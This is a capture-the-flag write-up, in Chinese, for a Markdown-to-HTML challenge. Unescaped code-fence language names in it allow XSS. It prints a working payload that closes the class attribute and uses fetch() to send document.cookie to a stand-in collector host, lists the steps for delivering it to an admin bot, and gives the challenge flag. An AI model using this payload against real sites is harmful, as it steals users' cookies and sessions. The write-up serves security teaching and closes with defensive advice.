# markdown-parser

## 题目简述

网站把 Markdown 转为 HTML，并允许提交同站 URL 给带 flag Cookie 的管理员机器人。普通文本经过 HTML 转义，但代码围栏后的“语言名”未经转义便拼进 `<code class="language-...">`，可逃逸属性并注入脚本。

## 解题过程

解析器对代码块开头执行：

```javascript
language = line.substring(3).trim();
htmlOutput += '<pre><code class="language-' + language + '">';
```

而模板使用 EJS 的 `<%- content %>` 原样输出生成结果。构造如下 Markdown；外层四个反引号只是为了在本文中完整展示载荷：

````markdown
```"><script>fetch('https://collector.example/leak?c='+encodeURIComponent(document.cookie))</script>
```
````

语言字段中的 `">` 会闭合 `class` 属性与 `<code>` 标签，随后的 `<script>` 进入真实 DOM。将整段 Markdown 做 Base64 和 URL 编码，生成 `/parse-markdown?markdown=...` 的同源页面，再点击反馈或直接请求 `/feedback?url=ENCODED_PAGE_URL`。

反馈端只允许与请求 Host 相同的 URL，这个载荷满足限制。管理员打开页面时持有非 HttpOnly 的 `flag` Cookie，脚本把 `document.cookie` 发送到收集端，得到：

```text
grey{m4rkd0wn_th1s_fl4g}
```

## 方法总结

Markdown 的元数据也属于不可信输入；只转义正文而忽略代码语言、链接目标或标题属性，仍会产生 XSS。安全实现应使用成熟解析器和 HTML sanitizer，对最终 DOM 做统一白名单清洗。机器人侧还应设置 HttpOnly Cookie、严格 CSP，并限制外部网络访问。
